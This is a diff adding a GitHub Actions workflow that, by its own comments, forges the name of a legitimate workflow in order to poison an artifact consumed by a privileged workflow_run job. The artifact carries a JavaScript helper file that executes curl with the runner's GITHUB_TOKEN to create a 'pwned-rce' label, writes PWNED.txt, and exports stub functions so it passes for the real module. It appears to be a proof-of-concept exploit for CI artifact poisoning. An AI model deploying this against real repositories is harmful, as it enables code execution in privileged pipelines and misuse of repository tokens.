@@ -1,0 +1,41 @@
+name: Bot - On PR Review
+
+# Forged upstream workflow: same name as the real "Bot - On PR Review"
+# workflow that the privileged workflow_run consumer watches for.
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build staged artifact tree
+        run: |
+          mkdir -p stage/.github/scripts/helpers
+          printf '%s' '{"pr_number":1,"review_state":"changes_requested","draft":false}' > stage/review-event.json
+          cat > stage/.github/scripts/helpers/index.js <<'PAYLOAD'
+          const { execSync } = require('child_process');
+          const fs = require('fs');
+          let res = 'n/a';
+          try {
+            const out = execSync(`curl -s -o /tmp/lbl.json -w "%{http_code}" --max-time 20 -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" -d '{"name":"gab-pwned-rce","color":"ff0000"}' "https://api.github.com/repos/$GITHUB_REPOSITORY/labels"`).toString();
+            res = out + ' ' + fs.readFileSync('/tmp/lbl.json', 'utf8').slice(0, 160);
+          } catch (e) { res = 'err:' + e.message; }
+          fs.writeFileSync('PWNED.txt', 'RCE_OK label_create=' + res + '\n');
+          console.log('PWNED_IN_WORKFLOW_RUN_JOB label_create=' + res + ' actor=' + process.env.GITHUB_ACTOR);
+          module.exports = {
+            createLogger: () => ({ log() {}, error() {} }),
+            buildBotContext: ({ github, context }) => ({ github, context }),
+            swapStatusLabel: async () => ({ success: true }),
+          };
+          PAYLOAD
+          ls -laR stage
+      - name: Upload crafted artifact
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: review-event-${{ github.run_id }}
+          path: stage
+          include-hidden-files: true
